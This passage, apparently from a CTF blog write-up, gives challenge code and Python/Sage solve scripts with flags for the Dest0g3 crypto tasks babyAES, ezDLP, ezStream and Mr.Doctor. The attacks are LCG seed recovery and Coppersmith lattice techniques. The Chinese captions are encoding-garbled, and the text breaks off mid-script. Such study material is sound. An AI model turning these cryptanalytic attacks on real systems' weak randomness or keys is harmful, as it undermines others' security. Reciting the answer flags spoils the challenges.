b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>AES-CBCè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DLPæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = </span><br><span class="line">h = </span><br><span class="line">x = discrete_log(mod(h,p),mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">8</span>] == <span class="string">&quot;Dest0g3&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.a = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.b = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.m = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a = &#123;&#125;\nb = &#123;&#125;\nm = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.a, self.b, self.m))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;state2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line">lcg.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 3939333498</span></span><br><span class="line"><span class="string">b = 3662432446</span></span><br><span class="line"><span class="string">m = 2271373817</span></span><br><span class="line"><span class="string">state1 = 17362</span></span><br><span class="line"><span class="string">state2 = 20624</span></span><br><span class="line"><span class="string">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>LCGï¼Œçˆ†ç ´æ±‚seedï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">3939333498</span></span><br><span class="line">b = <span class="number">3662432446</span></span><br><span class="line">m = <span class="number">2271373817</span></span><br><span class="line">state1 = <span class="number">17362</span></span><br><span class="line">state2 = <span class="number">20624</span></span><br><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    s1 = (state1&lt;&lt;<span class="number">16</span>)+i</span><br><span class="line">    s2 = (a*s1+b) % m</span><br><span class="line">    <span class="keyword">if</span> s2&gt;&gt;<span class="number">16</span> == state2:</span><br><span class="line">        seed = ((s1-b)*inverse_mod(a,m))%m</span><br><span class="line">        <span class="built_in">print</span>(seed)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 1315807869</span></span><br><span class="line"><span class="comment"># 710396196</span></span><br><span class="line"><span class="comment"># 104984523</span></span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªç»“æœåˆ†åˆ«ä»£å…¥æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878</span></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line">seed = [<span class="number">1315807869</span>,<span class="number">710396196</span>,<span class="number">104984523</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> seed:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.a = <span class="number">3939333498</span></span><br><span class="line">            self.b = <span class="number">3662432446</span></span><br><span class="line">            self.m = <span class="number">2271373817</span></span><br><span class="line">            self.seed = k</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">            <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    lcg = LCG()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    lcg.<span class="built_in">next</span>()</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(c[i] ^^ (lcg.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|</span></span><br><span class="line"><span class="comment"># Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;</span></span><br><span class="line"><span class="comment"># Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Mr-Doctor"><a href="#Mr-Doctor" class="headerlink" title="Mr.Doctor"></a>Mr.Doctor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">8</span>:-<span class="number">1</span>]</span><br><span class="line">seed = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RHODES_ELITE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Doctor = getPrime(<span class="number">64</span>)</span><br><span class="line">        self.Amiya = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Rosmontis = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.Blaze = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">        self.seed = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sha = SHA256()</span><br><span class="line">sha_flag = sha.encryption()</span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line">elite.output()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ash = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SliverAsh = &quot;</span>, elite.<span class="built_in">next</span>())</span><br><span class="line">W = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="number">3</span>) ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sha_flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(W))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Amiya =  956366446278</span></span><br><span class="line"><span class="string">Rosmontis =  1061992537343</span></span><br><span class="line"><span class="string">Blaze =  636205571590</span></span><br><span class="line"><span class="string">Doctor =  18068433704538283397</span></span><br><span class="line"><span class="string">Ash =  1097363493609113</span></span><br><span class="line"><span class="string">SliverAsh =  2051431344160327</span></span><br><span class="line"><span class="string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>äºŒé˜¶LCG + 4ä½ä¸€è½®çˆ†ç ´ï¼Œç”¨äºŒå…ƒCoppersmithæ–¹æ³•æ±‚seedï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">        R = f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            base = N ^ (m - i) * f ^ i</span><br><span class="line">            <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">            B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">            H.append(h)</span><br><span class="line">            I = H.ideal()</span><br><span class="line">            <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                H.pop()</span><br><span class="line">            <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                    root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                    roots.append(root)</span><br><span class="line">                    <span class="keyword">return</span> roots</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">c = <span class="number">636205571590</span></span><br><span class="line">p = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) ^ <span class="number">2</span> + b * ((state1 &lt;&lt; <span class="number">12</span>) + s1_low) + c - (state2 &lt;&lt; <span class="number">12</span>) - s2_low</span><br><span class="line">state1 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">0</span>] + (state1 &lt;&lt; <span class="number">12</span>)</span><br><span class="line">state2 = small_roots(f, (<span class="number">2</span> ^ <span class="number">28</span>, <span class="number">2</span> ^ <span class="number">28</span>), m=<span class="number">3</span>)[<span class="number">0</span>][<span class="number">1</span>] + (state2 &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = a * x * x + b * x + c - state1</span><br><span class="line">seed = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 626844643882</span></span><br></pre></td></tr></table></figure><p>ä»£å…¥é€4ä½çˆ†ç ´flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lcg</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.p = <span class="number">18068433704538283397</span></span><br><span class="line">        self.a = <span class="number">956366446278</span></span><br><span class="line">        self.b = <span class="number">1061992537343</span></span><br><span class="line">        self.c = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">l = lcg()</span><br><span class="line">seed = l.seed</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line">l.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">c = <span 